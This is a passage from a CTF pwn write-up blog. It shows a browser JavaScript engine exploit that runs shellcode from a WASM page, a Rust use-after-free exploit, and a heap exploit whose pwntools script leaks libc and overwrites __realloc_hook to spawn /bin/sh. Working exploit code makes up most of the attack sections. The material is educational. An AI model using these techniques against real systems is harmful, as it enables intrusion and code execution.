whatever I mentioned above to</span><br><span class="hljs-comment">// what you see in GDB until it makes sense</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// addr must be a 64-bit value here</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode</span>(<span class="hljs-params">addr, shellcode</span>) &#123;<br>    <span class="hljs-comment">// The backing store address of buf is not aligned to 64 bytes, so we have</span><br>    <span class="hljs-comment">// to write the upper 32-bits and the lower 32-bits of our address to two</span><br>    <span class="hljs-comment">// separate indices like this</span><br>    float_arr[<span class="hljs-number">20</span>] = <span class="hljs-title function_">itof</span>((addr &amp; <span class="hljs-number">0xffffffffn</span>) &lt;&lt; <span class="hljs-number">32n</span>);<br>    float_arr[<span class="hljs-number">21</span>] = <span class="hljs-title function_">itof</span>((addr &amp; <span class="hljs-number">0xffffffff00000000n</span>) &gt;&gt; <span class="hljs-number">32n</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; i++) &#123;<br>        dataview.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">4</span>*i, shellcode[i], <span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// msfvenom -p linux/x64/exec CMD=&#x27;./flagprinter&#x27; --format dword</span><br><span class="hljs-keyword">var</span> shellcode = [<span class="hljs-number">0x99583b6a</span>, <span class="hljs-number">0x622fbb48</span>, <span class="hljs-number">0x732f6e69</span>, <span class="hljs-number">0x48530068</span>, <span class="hljs-number">0x2d68e789</span>, <span class="hljs-number">0x48000063</span>, <span class="hljs-number">0xe852e689</span>, <span class="hljs-number">0x0000000e</span>, <br><span class="hljs-number">0x6c662f2e</span>, <span class="hljs-number">0x72706761</span>, <span class="hljs-number">0x65746e69</span>, <span class="hljs-number">0x57560072</span>, <span class="hljs-number">0x0fe68948</span>, <span class="hljs-number">0x00000005</span>];<br><br><span class="hljs-comment">// Now, we leak the address of our RWX page</span><br><span class="hljs-comment">// Using GDB, we know this address is at *(&amp;wasm_instance + 0x68)</span><br><span class="hljs-keyword">var</span> rwx_page_addr = <span class="hljs-title function_">compressed_arb_read</span>(<span class="hljs-title function_">addrof</span>(wasm_instance) + <span class="hljs-number">0x68n</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] RWX page address found: &quot;</span> + <span class="hljs-title function_">hex</span>(rwx_page_addr));<br><br><span class="hljs-comment">// Finally, we copy our shellcode to the RWX page and call the WASM function to</span><br><span class="hljs-comment">// execute it.</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Copying ./flagprinter shellcode to RWX page&quot;</span>);<br><span class="hljs-title function_">copy_shellcode</span>(rwx_page_addr, shellcode);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Printing flag!&quot;</span>);<br><span class="hljs-title function_">f</span>();<br><br></code></pre></td></tr></table></figure>





<h2 id="6-Zombie"><a href="#6-Zombie" class="headerlink" title="6 [Zombie]"></a>6 [Zombie]</h2><p>This is a medium heap exploit which involves exploiting a soundness hole in the rust type system. Everything is already set up for you, so you don’t have to think too hard about the actual soundness hole though.</p>
<p>The idea here is that you first create a dangling reference to a freed block of memory on the heap. This is done through the <code>infect</code> command, which calls the <code>zombie</code> function with a user provided parameter.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">zombie</span>(size: <span class="hljs-type">usize</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;static</span> <span class="hljs-keyword">mut</span> [<span class="hljs-type">u8</span>] &#123;<br>	<span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">object</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-string">b&#x27;A&#x27;</span>; size];<br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">r</span> = <span class="hljs-title function_ invoke__">virus</span>(object.<span class="hljs-title function_ invoke__">as_mut</span>());<br>	r<br>&#125;<br></code></pre></td></tr></table></figure>

<p>This zombie function first creates a heap allocated array filled with 0x41 of a user defined size, then calls the <code>virus</code> function.</p>
<p>This is a modification of rustlang issue 25860 as hinted in the code comments.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rust-lang/rust/issues/25860">https://github.com/rust-lang/rust/issues/25860</a></p>
<p>This is a long standing hole in rust’s (normally memory safe) type system which allows one to convert a reference lifetime to the static lifetime and therefore bypass rust’s borrow checker: convert <code>&amp;&#39;a T</code> to <code>&amp;&#39;static T</code> and a big no-no for memory safety.</p>
<p>I have modified this to work with a mutable pointer so now there is a dangling reference which can be used to both read from, and write to the freed block of memory.</p>
<p>Usually this could be done easily using rust’s <code>unsafe</code> keyword, but I decided to make this challenge extra baffling in exchange for source code access.</p>
<h3 id="The-Challenge"><a href="#The-Challenge" class="headerlink" title="The Challenge"></a>The Challenge</h3><p>The idea behind this challenge is that we have a shell with various commands, one of which is the “get flag” command, however that command is hardcoded to be ignored and a new command read in.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">match</span> line.<span class="hljs-title function_ invoke__">as_str</span>().<span class="hljs-title function_ invoke__">trim</span>() &#123;<br>	<span class="hljs-string">&quot;get flag&quot;</span> =&gt; <span class="hljs-keyword">continue</span>,<br>	<span class="hljs-string">&quot;infect&quot;</span> =&gt; infected = <span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-title function_ invoke__">infect</span>(&amp;<span class="hljs-keyword">mut</span> lines)),<br>	<span class="hljs-string">&quot;eat brains&quot;</span> =&gt; <span class="hljs-title function_ invoke__">eat_brains</span>(&amp;<span class="hljs-keyword">mut</span> lines, &amp;<span class="hljs-keyword">mut</span> infected),<br>	<span class="hljs-string">&quot;inspect brains&quot;</span> =&gt; <span class="hljs-title function_ invoke__">inspect_brains</span>(&amp;<span class="hljs-keyword">mut</span> lines, &amp;<span class="hljs-keyword">mut</span> infected),<br>	_ =&gt; (),<br>&#125;<br></code></pre></td></tr></table></figure>

<p>after the command is finished executing there is another check to see if the command was “get flag”, and if it was the flag is printed out.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">if</span> line.<span class="hljs-title function_ invoke__">as_str</span>().<span class="hljs-title function_ invoke__">trim</span>() == <span class="hljs-string">&quot;get flag&quot;</span> &#123;<br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">flag</span> = <span class="hljs-title function_ invoke__">read_to_string</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>).<span class="hljs-title function_ invoke__">unwrap</span>();<br>	<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Here&#x27;s the flag: &#123;&#125;&quot;</span>, &amp;flag);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>So we need to change the command while it is still inside the buffer during the execution of one of our commands.</p>
<p>We also have other commands, “eat brains” and “inspect brains” which allow us to read from and write to our dangling reference returned from the <code>infect</code> function.</p>
<p>The final piece of the puzzle is understanding how the <code>String</code> struct works in rust. It contains a pointer to the heap, and will reallocate to grow when all the heap space for its buffer is used up. In this case we are reading stdin line by line, so if a line is longer than any have previously been, it is possible to force the String struct in the line variable to reallocate to a buffer that we have previously freed.</p>
<h3 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h3><p>First our normal setup:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>)<br></code></pre></td></tr></table></figure>

<p>Now our first step is to create our dangling pointer:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendline(<span class="hljs-string">&quot;infect&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;32&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>This will create a pointer to a 32 byte piece of freed memory and then store that in the <code>infected</code> variable in main.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendline(<span class="hljs-string">&quot;eat brains                     &quot;</span>)<br></code></pre></td></tr></table></figure>

<p>Since the <code>.trim()</code> is called on each line before it is compared against the instructions, the trailing whitespace in this command will be ignored and the command recognised as “eat brains”.</p>
<p>The purpose of the trailing whitespace here is to force the line containing this command to allocate a 32 byte buffer to store the command. This will take the buffer we have previously freed and have a dangling reference to back out of the freed bins and use it as part of the string buffer.</p>
<p>Now we have also entered the “eat brains” function at the same time, so we are able to modify the buffer that now contains the “eat brains                     “ string.</p>
<p>The final piece of this puzzle is understanding how strings work in rust. Unlike in C, rust strings are not null terminated, instead the length of the string is stored alongside the pointer to the string and therefore in this case we do not have control over the length of the string.</p>
<p>If we simply replaced the first few bytes of the command buffer with the command we wanted and a null terminator we would end up with:<br>“get flag\x00s                     “</p>
<p>When this is <code>.trim()</code>ed the result would be “get flag\x00s” which would not match the required string “get flag”. Instead we overwrite a few more bytes of the command with the space character:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">brains</span>(<span class="hljs-params">string</span>):<br>	counter = <span class="hljs-number">0</span><br>	<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string:<br>		p.sendline(<span class="hljs-built_in">str</span>(counter))<br>		p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(c)))<br>		counter += <span class="hljs-number">1</span><br>	p.sendline(<span class="hljs-string">&quot;done&quot;</span>)<br><br>brains(<span class="hljs-string">&quot;get flag  &quot;</span>)<br></code></pre></td></tr></table></figure>

<p>Note the additional spaces at the end of the command, this will overwrite the “ns” in “brains” and cause the <code>.trim()</code> method to trim the command down to “get flag”, which then prints the flag.</p>
<h2 id="7-VECC"><a href="#7-VECC" class="headerlink" title="7-VECC"></a>7-VECC</h2><p>This is a hard heap exploitation challenge.</p>
<p>The idea is to first obtain a read&#x2F;write primitive on the heap, then progressively leak data until you know the location of libc, then overwrite the <code>__realloc_hook</code> to call <code>system(/bin/sh)</code>.</p>
<h3 id="1-Identifying-the-vulnerability"><a href="#1-Identifying-the-vulnerability" class="headerlink" title="1 - Identifying the vulnerability"></a>1 - Identifying the vulnerability</h3><p>The first thing to note when inspecting the binary logic is that bounds are being checked correctly so we have no buffer overflows or heap corruption, and there are no obvious double-frees or use-after-frees, however there is the glaring vulnerability that allocations are never zeroed and we must leverage this and only this to get a shell.</p>
<h3 id="2-The-essence-of-the-vulnerability"><a href="#2-The-essence-of-the-vulnerability" class="headerlink" title="2 - The essence of the vulnerability"></a>2 - The essence of the vulnerability</h3><p>For this exploit all you need is the tcache. There are the <code>vecc</code>s - which are simillar to c++’s <code>std::vector</code> or rust’s <code>Vec</code>. This is a small struct with a pointer (to a buffer), a length (of the used portion of the buffer), and a capacity (the maximum buffer length before reallocation is necessary). When a vecc is first created all fields should be NULLed to signal that a new buffer must be allocated upon first usage.</p>
<p>The key here is to notice that since allocations are not zeroed it is possible to groom the stack, then allocate a vecc from a tcache chunk without erasing the data on it.</p>
<p>This means that your allocated struct will leave the pointer as the <code>fd</code> pointer of the chunk from the tcache, as well as leaving the length and capacity unchanged from when the chunk was freed.</p>
<p>Furthermore since we have some control over the stack, it is possible to force this chunk <code>fd</code> pointer to point to another vecc struct as if it was the buffer of our new allocation.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> A                  B<br>+-----------+      +-----------+      +-----------+<br>| buf +----------&gt; | buf +----------&gt; | actual    |<br>+-----+-----+      +-----+-----+      | buffer    |<br>| len | cap |      | len | cap |      |           |<br>+-----+-----+      +-----+-----+      +-----------+<br></code></pre></td></tr></table></figure>

<p>Once we have the above structure we are free to use A to overwrite all 3 fields of B as if it was a regular byte buffer, then use B to read or write data at will.</p>
<p>This is made a little more difficult in that we do not have arbitrary write on the buffer of any of our veccs, instead we only have the ability to clear and append to the buffers.</p>
<p>The clear operation simply zeroes the <code>len</code> field of the struct and does nothing else.</p>
<p>The append operation is a little more complicated, it:</p>
<ul>
<li>Allocates a temporary buffer of user defined size n</li>
<li>Reads n bytes into the temporary buffer</li>
<li>Checks whether <code>len</code> + n &gt; <code>cap</code> - this would overflow the buffer</li>
<li>If necessary reallocates the vecc’s buffer to the next power of 2 size that would fit the existing buffer and the n new bytes while copying the data across, <code>cap</code> it also updated</li>
<li>Append the user data from the temporary buffer to the vecc’s buffer now that we’re sure we can not overflow it</li>
<li>Free the temporary buffer</li>
<li>Update the <code>len</code> to reflect the size of the new used portion of the buffer</li>
</ul>
<p>The end result is that a temp buffer is allocated and freed, and the vecc’s buffer is possibly reallocated to fit the required size, then the user data is appended to the vecc’s existing data.</p>
<p>Once we have our crafted heap structure we can use a clear, followed by an append to overwrite the entire vecc struct at will.</p>
<h3 id="3-The-exploit"><a href="#3-The-exploit" class="headerlink" title="3 - The exploit"></a>3 - The exploit</h3><p>For this exploit we first do some housekeeping since we have a shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit_proc</span>():<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_vecc</span>(<span class="hljs-params">index</span>):<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index))<br>	p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">destroy_vecc</span>(<span class="hljs-params">index</span>):<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index))<br>	p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">append_vecc</span>(<span class="hljs-params">index, buffer, readline=<span class="hljs-literal">True</span></span>):<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index))<br>	p.recvline()<br>	p.sendline(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(buffer)))<br>	p.send(buffer)<br>	<span class="hljs-keyword">if</span> readline:<br>		p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_vecc</span>(<span class="hljs-params">index</span>):<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index))<br>	p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_vecc</span>(<span class="hljs-params">index, <span class="hljs-built_in">bytes</span></span>):<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index))<br>	<span class="hljs-keyword">return</span> p.recv(<span class="hljs-built_in">bytes</span>)<br><br><span class="hljs-comment"># p = remote(&quot;localhost&quot;, 1337)</span><br>p = process(<span class="hljs-string">&quot;../publish/vecc&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>This simply reflects all of the shell commands we might need to use. Now lets get to grooming the heap for our primitive.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">create_vecc(<span class="hljs-number">0</span>)<br>append_vecc(<span class="hljs-number">0</span>, <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x10</span>)<br></code></pre></td></tr></table></figure>

<p>We first create a vecc struct then append bytes to it.</p>
<p>It is important to write 0x10 bytes to this buffer since our aim is to have this buffer later interpreted as a vecc struct. For this to work we must make sure that it will be placed in the same tcache bin as a vecc struct would and therefore we should match the size of the vecc struct.</p>
<p>Note that this will also allocate and free a temporary buffer of size 0x10 while user data is read in, we now have 1 chunk in the tcache.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">destroy_vecc(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p>After this line first the vecc’s buffer will be freed, then the vecc will be NULLed and freed.</p>
<p>Now the tcache looks like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tcachebin:<br><br>(was vecc)         (was buffer)       (was temp)<br>+-----------+      +-----------+      +-----------+<br>| fd  +----------&gt; | fd  +----------&gt; | fd = NULL |<br>| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |<br>| 000000000 |      | AAAAAAAAA |      | AAAAAAAAA |<br>+-----------+      +-----------+      +-----------+<br></code></pre></td></tr></table></figure>

<p>Finally we complete our crafted structure:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">create_vecc(<span class="hljs-number">1</span>)<br>create_vecc(<span class="hljs-number">2</span>)<br>create_vecc(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure>

<p>Now we have allocated back from the tcache with some new structure:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> 1                  2                  3<br>+-----------+      +-----------+      +-----------+<br>| buf +----------&gt; | buf +----------&gt; | buf = NULL|<br>+-----+-----+      +-----+-----+      +-----+-----|<br>| 000 | 000 |      | AAA | AAA |      | AAA | AAA |<br>+-----+-----+      +-----+-----+      +-----------+<br></code></pre></td></tr></table></figure>

<p>Since 1 has capacity 0 any write will resule in a reallocation, so we don’t touch 1 from now on, but now with 2 and 3 we have the same structure as in the original diagram - we are able to use 2 to overwrite the entire of 3, then utilise 3 for arbitrary read &#x2F; write.</p>
<p>Now we know we have PIE disabled, therefore we are able to leak libc addresses from the GOT.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">puts_got = <span class="hljs-number">0x601fa0</span><br>clear_vecc(<span class="hljs-number">2</span>)<br>append_vecc(<span class="hljs-number">2</span>, p64(puts_got) + p32(<span class="hljs-number">8</span>) + <span class="hljs-string">b&quot;AAAA&quot;</span>)<br>puts_libc = u64(show_vecc(<span class="hljs-number">3</span>, <span class="hljs-number">8</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Puts address: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_libc)))<br><br>free_got = <span class="hljs-number">0x601f90</span><br>clear_vecc(<span class="hljs-number">2</span>)<br>append_vecc(<span class="hljs-number">2</span>, p64(free_got) + p32(<span class="hljs-number">8</span>) + <span class="hljs-string">b&quot;AAAA&quot;</span>)<br>free_libc = u64(show_vecc(<span class="hljs-number">3</span>, <span class="hljs-number">8</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Free address: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(free_libc)))<br></code></pre></td></tr></table></figure>

<p>This is enough to figure out the version of libc being used and the location of any other symbols needed.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = puts_libc - <span class="hljs-number">0x809c0</span><br>system = libc_base + <span class="hljs-number">0x4f440</span><br>realloc_hook = libc_base + <span class="hljs-number">0x3ebc28</span><br>str_bin_sh = libc_base + <span class="hljs-number">0x1b3e9a</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Realloc hook address: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(realloc_hook)))<br></code></pre></td></tr></table></figure>

<p>Now we overwrite our realloc hook with the address of <code>system</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">clear_vecc(<span class="hljs-number">2</span>)<br>append_vecc(<span class="hljs-number">2</span>, p64(realloc_hook) + p32(<span class="hljs-number">0</span>) + <span class="hljs-string">b&quot;AAAA&quot;</span>)<br>append_vecc(<span class="hljs-number">3</span>, p64(system))<br></code></pre></td></tr></table></figure>

<p>Finally, we overwrite the buffer pointer of one of our vecc structures with a pointer to “&#x2F;bin&#x2F;sh” from within libc, then trigger a reallocation by appending a single extra byte, giving us a shell.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">clear_vecc(<span class="hljs-number">2</span>)<br>append_vecc(<span class="hljs-number">2</span>, p64(str_bin_sh) + p32(<span class="hljs-number">8</span>) + p32(<span class="hljs-number">8</span>))<br>append_vecc(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;A&quot;</span>, readline=<span class="hljs-literal">False</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2020/09/26/security/ctf/wp/wp-jk-2020/">← Next 极客巅峰2020</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2020/09/13/security/kernel-pwn-env/">kernel pwn环境搭建 Prev →</a></div></div></div><details id="reward"><summary>打赏</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DownUnderCTF-PWN-WP"><span class="toc-text">DownUnderCTF PWN WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-shellthis"><span class="toc-text">1 [shellthis]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-return-to-what"><span class="toc-text">2 [return-to-what]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-echos"><span class="toc-text">3 [echos]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-return-to-whats-revenge"><span class="toc-text">4 [return-to-whats-revenge]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-is-this-pwn-or-web"><span class="toc-text">5 [is-this-pwn-or-web]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js-exp"><span class="toc-text">js exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Zombie"><span class="toc-text">6 [Zombie]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Challenge"><span class="toc-text">The Challenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Exploit"><span class="toc-text">The Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-VECC"><span class="toc-text">7-VECC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Identifying-the-vulnerability"><span class="toc-text">1 - Identifying the vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-The-essence-of-the-vulnerability"><span class="toc-text">2 - The essence of the vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-The-exploit"><span class="toc-text">3 - The exploit</span></a></li></ol></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">2022 by i0gan</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'TzNey4n3v0Sx6vdBbytYLoH9-gzGzoHsz'
 , appKey: 'GIXXrK9zLxt0bZLww1hte0Oq' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>